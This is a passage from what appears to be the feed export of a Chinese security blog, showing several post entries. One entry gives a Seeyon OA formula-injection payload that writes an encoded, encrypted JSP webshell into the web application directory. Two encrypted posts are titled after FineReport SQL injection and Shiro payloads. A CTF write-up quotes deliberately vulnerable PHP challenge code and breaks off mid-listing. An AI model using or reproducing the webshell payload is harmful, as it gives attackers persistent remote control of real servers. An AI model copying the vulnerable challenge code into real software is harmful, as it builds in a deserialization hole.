%B7c%C3%90%1C%C2%8EBN%C3%99%C2%AC-%C3%AAC%2C%C2%BDb%15%C2%A1X%C3%96%28%C3%90%02XS%C3%A0%1D%16x%3E%C3%90HX%C3%A7%C3%91%19%7B%C2%A9+S%C2%84%C3%95o%C3%A3%C3%A8%1D%C3%84+%2C%1C%C2%8EV%C3%AD%19%C2%83%C3%ACP%C3%B4mRI.%7C%C2%9Ea%0E%C2%B3%C2%84Az%C2%9E0U%C2%87%06%C2%A9%C3%AE%21g%3B%2B%60%C3%90%C2%A5%5E%5Ch%C3%82%C2%99%C3%9F%C2%91J4%C2%BA%C3%96%C3%B0%C2%95%C3%A9%1B%C3%91%215J%C3%A6%C3%A8%40%0C0%0EN%C3%B9%C3%A6%C3%A6x%7ER%C2%9C%C2%AA%C2%85A%C3%92%C2%A1%C3%99%C3%95%C2%91%18cAJ%C3%AC%C2%88%1E%C2%80%C3%86%C2%B1.%27%22%C3%A0%1C%C3%96b%C3%8F%C3%AD%C3%84%C2%A7%C3%95+%23b%C2%8F%C3%A6%C3%9A+%C2%BA%C2%B1%3B%C3%A3%C3%8A%C3%B4%C2%AD%C2%99%C2%8A*m%C2%BD%C3%82%C3%AAm-h%C3%AD%C3%A1w%C2%9A9%0A3%C2%A2%C3%8Bu%C3%84%C3%A6%C2%98%C3%9F%17u%26l%C3%961%C3%A6%C2%AFs7%C2%A5a%2C%C3%94%C2%AB1%C3%83%02Nv%C2%A0%7B%25%C2%B6%C3%99%C3%9A%C2%AF%C3%B1%C3%90G%0E%C3%A7%C3%AF%C3%8C%C2%B1%17%60NK%C2%A0%21%16%C2%895%1A4%C2%91%C2%A3%C3%BA%16%C2%B7O%17%C2%90%3F%27%C2%A2_p%C2%8C%C2%A0%06+q%C2%BB%3A%3D%C2%BB%C3%86%C3%8By%C2%BD%C3%82%C2%89C%C2%A1w%C2%B6%5B%C3%A9U%5D%0FJ%2F%C2%BD%C3%B2%C2%A1%19%C2%A7rt%5B%C2%9B%02%C3%80U%01u%C2%AB%7E%C2%A7%C2%9F%3B.%C3%99j-%C2%B5%C2%AD%C3%AE%0D%C2%88%C2%AE%C2%8F%C2%A7%C2%B5%C3%96%C3%AF%C3%99%C3%9E%C2%9A%C2%9C%C3%BF%04%3E%11Z%C2%BF%C3%BF%C3%8D%C2%88E%C3%BA%7F%C3%83%C3%9C%7B%C2%9C%C3%BF%C2%BD%C2%BC%C3%95%C3%BDF%3F%C2%B5%C3%89e%C2%B1%0A%C3%99%C2%B5%04c%3B%C3%B1%C2%BE%C2%8Ee%C2%8D%C3%AF%27%23JAKV%C2%9D%18b%3E%C2%B6y%C2%A7pl%C2%BA%C3%BA%C3%BF%C2%96%1D%C3%92%C3%90%0E%7DS%C3%86%C3%BD%C2%83%C3%9F%C3%866%C3%A5%5B%C3%BC%C3%A3%C2%BA%C2%885%C2%BD%C2%A9%C2%89%C3%80%5D%C2%9C%27%C3%90%1E%29%C2%B1%C3%88U%C3%82G-O*%5C%60-%C3%B8k%C3%B2%C3%91%C2%8D5%C3%94%09GS%C2%B0%C3%B66%C2%BES%C3%80u%263%C2%B4J%C3%B3l%0Bct%C3%8C%07%C3%82%C2%AB%C3%BBv%7B%C3%BFZ%0F%21n%22h%C2%97%C2%98%40%0C.xm%C2%AEo%C3%B6%0E%C3%B4%1B%C3%97%27%C3%8Di%7C%C3%BCv%C2%B3%3F%C2%98AN%C2%A0%C2%87%03%C3%BD9kK%C2%83%11%09%C3%B7x%C2%90%C3%8B3G%C2%98%C3%80%06%C2%9E%00%0FJk%C3%A0%1C%C3%B9K%2Cv%C2%B5%C2%AF%C3%A1%0E%C3%93r%C2%B1%C3%BB%C3%AC4O%27v%C2%BF%5B%C2%B7Z%7B%C3%B8%C2%9Df%0E*%C2%B2%06%C3%B3GC%C3%AB%C3%A3%C2%B86uM%05%1D%C3%9D%C2%83%C3%B67X%C2%BF%C3%91g%C2%B4%C3%B9%C3%A59%095%C3%98%C3%826%5B%C3%BB%15%C3%8E%C3%96%1A%C3%98%C3%A1%C3%A8%10%C3%ACb%C2%9CMa%7C%C2%ADO%C2%B8%1F%C3%81%3A9%0E%0B%C3%90O%C3%92%22s%24%C2%9C%C2%B0%7Ezv%C3%8D%C3%8B%C3%93zG%C2%89%C2%81%C3%BB%125w%C2%80%C2%BFak%C2%B7%C3%96%C2%99%C2%BA%C2%87%C2%85%3A%C3%B7%C3%9A%C2%87f%C2%9C%12%C2%B4%18%C2%ADy+Z%C2%BA%C2%9E%C2%B7%5C%01%C3%BCW%C3%B7h%C3%80%5Bj%C3%85%C3%A6n%03%C3%B5%C3%8Bl%C3%B2h%C2%B7%7DT%C2%AB%C2%B9l%C3%85%C2%8B%C3%A3%C2%B3%C3%BC%C2%AA%C2%8F%7C%0B%7FrxQ%5B%C3%9E%C2%AB%0F%C3%95%C3%B7%14%13%C3%A0s%C2%B3%C2%AEEd%C3%AE%C3%AC%C2%90%C3%B2-MI%C3%B8X%C3%AC%5B%01%C2%95otq%0B5%C2%82Q%08%5C%C3%ABN%C3%B9%C2%B8%C3%81%C2%8D%C3%9F%C3%8B%1D%5E%23%C3%94%7C%5CO%21%1E%C2%AF%C3%AA%C3%B7%C3%BF%3D%1F%C3%AA%C3%98%C3%91%C3%8C%08%C3%BB%C3%BB%C3%97%C3%A6%C3%A5%C2%BF%C3%B6%C2%A0%C3%A5%C2%ADZP%C3%B7%C2%98%C3%97%C3%97%C2%B8%0Fq%C3%B4y%C3%91%C3%96%C3%82%C2%B6%27y%1A%C3%937%C3%B7w%C3%8D%C2%9E%C3%B5%08%7Dv%0Ax%C3%88%C2%A0%C3%9F%C3%BC%C3%94%C3%A5h%1B%3F%C3%88%09%60g%C3%9A%C3%89G%C3%8B%1B%05z%15%C3%B5%C3%A0h%C2%B8%C3%AF%C2%AAt%7Be%C3%A8s%C3%80%C2%81J%C3%A0%C3%BD%C2%94%5Dq%C2%B9%C3%AD%C3%AD%C2%98%10%C3%A6%C3%B5q%C2%8Dr%C3%87%7Eu%0D%C2%B1%C2%8D%40_%C2%8Ff%1B%13%0EE%C2%80%C3%8F%23%C3%AE%3B%C3%B1%C3%BA%C3%AB%5C%C2%B1%04%C2%8E%C2%B7%01%C3%BC%C2%AFj%19%C3%87R%16G%C3%BB%26%C3%B4%1D%60%C2%8Bn%C3%BB%C2%81%C3%8B%C2%BD%C2%8E%C2%88%C3%BB%5E%C2%BC%C3%86%C3%82%C3%86%C2%B5E%C2%97%C2%B0%C3%96%05%0Eh%14%C3%A4xo%C3%A8%28%C2%B3H6%C3%A4%C3%9B%1C%C2%B1%1E%C3%B656%15%C3%98%C2%93%C3%87%12rg%C2%AB%5B5%C3%A9%C3%95%5E%C2%B2%C3%AA3%25%C2%A1%C2%8E%C3%8Di%C3%BF%01%C2%B9D%16%C3%8C%7F%C3%A9%C3%8F%1C%C3%99%C2%BA%C2%8A%C3%BB%C3%AF7%C3%BCic6%3F%C2%9E%7Dj%C3%B5%C2%B9%C2%8E%C2%95p%C3%89%C3%A7Sm6qM%1E%7BI%C3%A3k%C3%9A%5D%C2%BB%C3%B9%C3%AE%C3%9AC%C2%A8%C2%95PO%C2%89n%3F%7F1G%C2%B4%C2%A8r%C3%8Bfv%C3%A9Wg%0E%2B%C2%92%C2%86%3EZ%1D%3A%C2%97%C3%A3%C2%A0%26%C2%89%7B%C2%8B%C2%84%C2%BDC%1D%27%1D%C3%AF%1Fp%C3%BE%21%3E%C2%83%C3%AAZ%C3%B6%C3%B1%C2%9E%07%C2%9F%7B%40%2FR%C3%B7%C2%A7%02%C3%9E%03L%C2%A6%C3%A4%C2%ABu%C3%BD%C2%8E%C2%AD%16%C2%83M%7DW%12%C3%80%C3%93%15.%C3%8D%C3%A0b%0F%C2%90%C3%A2%C2%BD%22%C3%A0%08jyx%C2%B9W%C3%84%C2%B9%190%C2%90w%11Uxc%1D%C2%BCw%C2%AA%C3%B2%C2%BB%C2%88%C3%ABk%C2%81%C3%AB%C2%87%22%C3%AC%C2%8D%60Owl%C2%B8%C2%9F%2C%C3%97%C3%869%C3%A7%C3%BA%C3%BB%C2%BD%C3%9C%C3%B3z%C2%BF%C2%AB%C3%8Eqbq%0B%C3%BE%C3%80%C2%B3%03r%26%C3%83%C3%AF%0B%C3%B2%7Cf%C3%B4%C3%A4%C3%BD%C3%B8q%3E%C2%BC%C3%AAeE%C3%BC%10%05%C2%99%C3%BD%C3%80%C2%8C%C3%A4%C3%A9%C3%97%C3%A1%C3%84%C2%B5%13%C3%87%7D%C3%A99%C3%8Do%7Dtu%7B%C3%90%C2%87%C3%ABS%C2%AA%C3%BA%C2%B5%C3%A6O%C3%BDn%C3%BD%C3%A7Cc%C3%B0%C2%A1%C3%BEe%C2%8A%C3%A7g0P%1Dj%7D%C3%BC%7C%C2%A7%C2%AC%C3%99%7F%7C%C3%AF%1Ezu%C2%8F%C3%8F%1E%C2%AA%3F%28%C3%BE%C3%905%C3%BE%C3%96X%1B%25%C2%99%0B%C2%8E%C3%BD%C3%B9%07%3E%C3%9E%C2%83%0B%C3%87%7D%C3%AEe%C3%B9%26%0F%C3%AC%C3%9E%C3%A1p%C3%B8%C3%B0%C3%B1%C3%97%C3%BD%C2%9F%C2%9F%7B%C3%B7%C3%B7%C2%9F%7B%C2%BF%C3%B0o%C3%BER%C2%B8%C3%B7%C3%BF%C3%BE%0F%C2%A7%C3%92%C3%BC%C2%90.%14%00%00"</span>);</span><br><span class="line"></span><br><span class="line">$s = iconv(<span class="string">"UTF-8"</span>,<span class="string">"latin1"</span>,$s);</span><br><span class="line">$s = gzdecode($s);</span><br><span class="line">echo $s;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">'formulaType'</span>: <span class="type">1</span>, <span class="string">'formulaName'</span>: <span class="type"></span>'test<span class="string">', '</span>formulaExpression<span class="string">': '</span><span class="keyword">String</span> path = <span class="string">"../webapps/seeyon/"</span>; java.io.PrintWriter printWriter2 = <span class="keyword">new</span> <span class="type">java</span>.io.PrintWriter(path+<span class="string">"SeeyonUpdate.jspx"</span>); <span class="keyword">String</span> shell = <span class="string">"PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+CVN0cmluZyB4YyA9ICI5MTJlYzgwM2IyY2U0OWU0IjsgICAgU3RyaW5nIHBhc3MgPSAiYXNkZmtqZXdhZGYiOyAgICBTdHJpbmcgbWQ1ID0gbWQ1KHBhc3MgKyB4Yyk7ICAgIGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlciB7ICAgICAgICBwdWJsaWMgWChDbGFzc0xvYWRlciB6KSB7ICAgICAgICAgICAgc3VwZXIoeik7ICAgICAgICB9ICAgICAgICBwdWJsaWMgQ2xhc3MgUShieXRlW10gY2IpIHsgICAgICAgICAgICByZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7ICAgICAgICB9ICAgIH0gICAgcHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLCBib29sZWFuIG0pIHsgICAgICAgIHRyeSB7ICAgICAgICAgICAgamF2YXguY3J5cHRvLkNpcGhlciBjID0gamF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7ICAgICAgICAgICAgYy5pbml0KG0gPyAxIDogMiwgbmV3IGphdmF4LmNyeXB0by5zcGVjLlNlY3JldEtleVNwZWMoeGMuZ2V0Qnl0ZXMoKSwgIkFFUyIpKTsgICAgICAgICAgICByZXR1cm4gYy5kb0ZpbmFsKHMpOyAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsgICAgICAgICAgICByZXR1cm4gbnVsbDsgICAgICAgIH0gICAgfSAgICBwdWJsaWMgc3RhdGljIFN0cmluZyBtZDUoU3RyaW5nIHMpIHsgICAgICAgIFN0cmluZyByZXQgPSBudWxsOyAgICAgICAgdHJ5IHsgICAgICAgICAgICBqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTsgICAgICAgICAgICBtID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTsgICAgICAgICAgICBtLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpOyAgICAgICAgICAgIHJldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTsgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7ICAgICAgICB9ICAgICAgICByZXR1cm4gcmV0OyAgICB9ICAgIHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24geyAgICAgICAgQ2xhc3MgYmFzZTY0OyAgICAgICAgU3RyaW5nIHZhbHVlID0gbnVsbDsgICAgICAgIHRyeSB7ICAgICAgICAgICAgYmFzZTY0ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOyAgICAgICAgICAgIE9iamVjdCBFbmNvZGVyID0gYmFzZTY0LmdldE1ldGhvZCgiZ2V0RW5jb2RlciIsIG51bGwpLmludm9rZShiYXNlNjQsIG51bGwpOyAgICAgICAgICAgIHZhbHVlID0gKFN0cmluZykgRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXdDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W117YnN9KTsgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7ICAgICAgICAgICAgdHJ5IHsgICAgICAgICAgICAgICAgYmFzZTY0ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyAgICAgICAgICAgICAgICBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyAgICAgICAgICAgICAgICB2YWx1ZSA9IChTdHJpbmcpIEVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZSIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W117YnN9KTsgICAgICAgICAgICAgICAgdmFsdWUgPSB2YWx1ZS5yZXBsYWNlKCJcbiIsICIiKS5yZXBsYWNlKCJcciIsICIiKTsgICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZTIpIHsgICAgICAgICAgICB9ICAgICAgICB9ICAgICAgICByZXR1cm4gdmFsdWU7ICAgIH0gICAgcHVibGljIHN0YXRpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBicykgdGhyb3dzIEV4Y2VwdGlvbiB7ICAgICAgICBDbGFzcyBiYXNlNjQ7ICAgICAgICBieXRlW10gdmFsdWUgPSBudWxsOyAgICAgICAgdHJ5IHsgICAgICAgICAgICBiYXNlNjQgPSBDbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7ICAgICAgICAgICAgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7ICAgICAgICAgICAgdmFsdWUgPSAoYnl0ZVtdKSBkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGUiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtde2JzfSk7ICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgeyAgICAgICAgICAgIHRyeSB7ICAgICAgICAgICAgICAgIGJhc2U2NCA9IENsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgICAgICAgICAgICAgICAgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgICAgICAgICAgICAgICAgdmFsdWUgPSAoYnl0ZVtdKSBkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtde2JzfSk7ICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUyKSB7ICAgICAgICAgICAgfSAgICAgICAgfSAgICAgICAgcmV0dXJuIHZhbHVlOyAgICB9PC9qc3A6ZGVjbGFyYXRpb24+PGpzcDpzY3JpcHRsZXQ+dHJ5IHsgICAgYnl0ZVtdIGRhdGEgPSBiYXNlNjREZWNvZGUocmVxdWVzdC5nZXRQYXJhbWV0ZXIocGFzcykpOyAgICBkYXRhID0geChkYXRhLCBmYWxzZSk7ICAgIGlmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpID09IG51bGwpIHsgICAgICAgIHNlc3Npb24uc2V0QXR0cmlidXRlKCJwYXlsb2FkIiwgbmV3IFgocGFnZUNvbnRleHQuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5RKGRhdGEpKTsgICAgfSBlbHNlIHsgICAgICAgIHJlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIiwgbmV3IFN0cmluZyhkYXRhKSk7ICAgICAgICBPYmplY3QgZiA9ICgoQ2xhc3MpIHNlc3Npb24uZ2V0QXR0cmlidXRlKCJwYXlsb2FkIikpLm5ld0luc3RhbmNlKCk7ICAgICAgICBmLmVxdWFscyhwYWdlQ29udGV4dCk7ICAgICAgICByZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDAsIDE2KSk7ICAgICAgICByZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChiYXNlNjREZWNvZGUoZi50b1N0cmluZygpKSwgdHJ1ZSkpKTsgICAgICAgIHJlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMTYpKTsgICAgfX0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7fTwvanNwOnNjcmlwdGxldD48L2pzcDpyb290Pg=="</span>; sun.misc.BASE64Decoder decoder = <span class="keyword">new</span> <span class="type">sun</span>.misc.BASE64Decoder(); <span class="keyword">String</span> decodeString = <span class="keyword">new</span> <span class="type">String</span>(decoder.decodeBuffer(shell),<span class="string">"UTF-8"</span>); printWriter2.println(decodeString); printWriter2.close();&#125;;test();def <span class="keyword">static</span> xxx()&#123;<span class="string">'&#125;, '</span><span class="string">', &#123;&#125;, '</span><span class="literal">true</span><span class="string">']</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>帆软FineReport 官网DEMO SQL注入</title>
    <url>/2020/09/13/%E5%B8%86%E8%BD%AFFineReport-%E5%AE%98%E7%BD%91DEMO-SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码不正确，请重新输入！" data-whm="文章不能被校验, 不过您还是能看看解密后的内容！">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已受密码保护, 请您输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="80d8122d0073bf01ed9e6f19e29e423970e89a9f6a86d1e0a486bf0107c686f9">8ed0253de3c74369ceb44c80e92e2b9cdcc6dcacfff7d9a02b9392a62972a393661aaf3bcabdcdb4e9d91950e00b5a6ff11eb05293b4246950a602c0d0efe4e73fb39227b7b428fc5187f33abb9e10f3faa2fd53bcf9c9b2609c733f48b5fb1f48869ab71f7021ef3b599186dd3bd28072004c4dedc4ce691f23989c59f3b309c04c53289cb01e22fb74c7657835720541faf108cd24d2cc78fcfe38ac97b123f1528df95666ac63814ddb0e66a9b8532a344b3ca5e71f1703c8ce85b8d90142f87f58640a7eca8e8ddcc3b867c8567f4ab836a44d5d5ca55edb7176103a37f8cdbd27d1d3f44e3c148f05fd698f0f14437762fb28c6713b388226f387c38931c6cd6b72e55de48e96bf1341956de9adf872fcc7c65d2518701ace89dfd627d0c9bc77888d8e8e211f24f23c6c0830ccdd6ce150c21d600f6f2cd6a47e935c362b6f6bb432a51199041accee8eb5e4a8ff35d952ce23adb0099c4cd40650d266c5dbfe4d0290afdeb617d67b142c98c340176348c676c475370c5abe6a6cbd841cd6b27ae823906ce53c57c7ed0e3d3e83548a2e55eb1919ed056622bc579f24226ef04502baef0ad0a7c0eca31e338d7e2d281d1658eeee8f08de5192db60195155f86b318d008b5c7f062ce63bb3a1c3d594c8f707521ba5f536bd4aca09b5de36d8fcedfce21e5816b4150fe45ee2d81d515f0cc73ede4c636f30058c51a3f988b48f8b9411d93ee126348b0a390779f1e696dafc4b364b6389cb0d11d9258c617298677a6b0bb47ed417f282351b07ac9af5fb4e04d7c5c16ba54db8292fe90b6c4622201de43bc541796755e8ae744d260c811c37451d88a1401cf7d19b18df9bfe7892da02f7d402a6ff8aeaa254b2543c5c744bf979169d1efa5090b134db897458916f4661eab9d7a810aaa93ae71cf0218c17765aa13e73b3d1fcb0b146dd76ee66cd2f3a8bb1db69fd330fcb2f00c96af12fc864a5a552b2c6b6d07193c65fce5d4cadb2bc66eec74f5dd36e0f6ed39456a8eacf65241c5bcf47367090acd1439921aa02522425e71557e03475db3e9e145e8557cd784565b351aeb6420c4006f94df79bdf5170e804187d159d17d5bf5968ee84f61783b17b6f35f57adcb62d2ed7b8e5dae477c48de8e0cdc5bcce580da81428f334b747b0510751fdeec5dcec97b8a2949d828b9d5b25ec48beb618ac9e67e1d8afee642c27ee64695b7f59a26e94d3cc738789a8563bd25e96223985c89cd83429a0c9632afc816401dbc182fed269ad8f1b780b7e90956202f0bfa63589879ee19a8c94da0792b40e8e0347ad003d821517be14de34dee865dc36f4fe43c23b7ec64e28da6429301a445b1f3f2d35f4f943c1f634ac573b22101b7eb4076cfffb11a58bf9fc21219aeeda2f563b27dafd383a4fab9803cae23864c49affde16c61f1317d93ddceedbd31ca3952a9b1cb6d011323b2e00a0fb652164510ad20f85b13d546b498893da44c7e05b43251ee60c5ba72dcb2edabc6546128e44b0c07012acb48b19e8eb16100247c3f62a3909fa2d3db1cd</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Vul</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro Payload EXP提取</title>
    <url>/2020/09/12/Shiro-Payload-EXP%E6%8F%90%E5%8F%96/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码不正确，请重新输入！" data-whm="文章不能被校验, 不过您还是能看看解密后的内容！">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已受密码保护, 请您输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="dbdc442b7830f9ea0e1ce20c1d12404b793f0445301226a2dc3b11bb27b4d137"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次CTF拉练</title>
    <url>/2020/06/12/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章讲述了一次CTF拉练的一道php的白盒审计题，该文章也是接着Phar://这篇文章写的，主要是记录一下。</p>
<a id="more"></a>

<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/index.php.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="string">"/var/www/data/secret"</span>)) &#123; <span class="comment">//判断是否存在secret文件，不存在将写入secret文件，存在读取文件</span></span><br><span class="line">    $SECRET = randomkeys(<span class="number">16</span>); <span class="comment">//生成16随机字符</span></span><br><span class="line">    file_put_contents(<span class="string">"/var/www/data/secret"</span>, $SECRET); <span class="comment">//将生成的16随机字符串写入secret文件</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $SECRET = file_get_contents(<span class="string">"/var/www/data/secret"</span>); <span class="comment">//将整个文件读入一个字符串</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>])) <span class="comment">//判断$_SERVER["HTTP_X_REAL_IP"]是否设置并且非空</span></span><br><span class="line">	$SERVER_IP = $_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>]; <span class="comment">//true就赋值给$SERVER_IP</span></span><br><span class="line"><span class="keyword">else</span> $SERVER_IP = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//false就获取用户的 IP 地址赋值给$SERVER_IP</span></span><br><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span> . base64_encode(<span class="string">"ctf"</span> . $SERVER_IP); <span class="comment">//路径为/var/www/data/加base64编码(ctf+$SERVER_IP) .代表拼接</span></span><br><span class="line">@mkdir($SANDBOX); <span class="comment">//创建$SANDBOX文件夹 单独的沙盒文件夹</span></span><br><span class="line">@chdir($SANDBOX); <span class="comment">//改变目录$SANDBOX</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123; <span class="comment">//检查变量是否已设置且不为NULL，不存在将</span></span><br><span class="line">    $data = serialize(<span class="keyword">new</span> User($SANDBOX)); <span class="comment">//序列化</span></span><br><span class="line">    $hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET); <span class="comment">//生成哈希值，sha1算法，$data加密数据，$SECRET为所使用的密钥，</span></span><br><span class="line">    setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac)); <span class="comment">//向客户端发送一个HTTPcookie，唯一的标识对象加上签名作为session-data</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123; <span class="comment">//允许在实例化一个类之前先执行构造方法。</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = $path; <span class="comment">//标识路径为头像的路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; <span class="comment">//析构函数</span></span><br><span class="line">        $_GET[<span class="string">"lucky"</span>](); <span class="comment">//php 通过GET变量来调用函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomkeys</span><span class="params">($length)</span></span>&#123;   <span class="comment">//定义生成随机数方法</span></span><br><span class="line">    $output=<span class="string">''</span>;   </span><br><span class="line">    <span class="keyword">for</span> ($a = <span class="number">0</span>; $a&lt;$length; $a++) &#123;   </span><br><span class="line">        $output .= chr(mt_rand(<span class="number">0</span>, <span class="number">0xFF</span>));    <span class="comment">//生成php随机数   </span></span><br><span class="line">     &#125;   </span><br><span class="line">     <span class="keyword">return</span> $output;   </span><br><span class="line"> &#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span> </span>&#123; <span class="comment">//定义读取flag方法</span></span><br><span class="line">    $flag = file_get_contents(<span class="string">"/flag"</span>);		<span class="comment">//把文件字符串读取赋值给$flag</span></span><br><span class="line">    <span class="keyword">echo</span> $flag;  <span class="comment">//输出flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $SECRET;</span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>); <span class="comment">// 从cookie中取出data和hmac签名存到数组（字符串打散为数组）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123; <span class="comment">#判断是否为空</span></span><br><span class="line">        <span 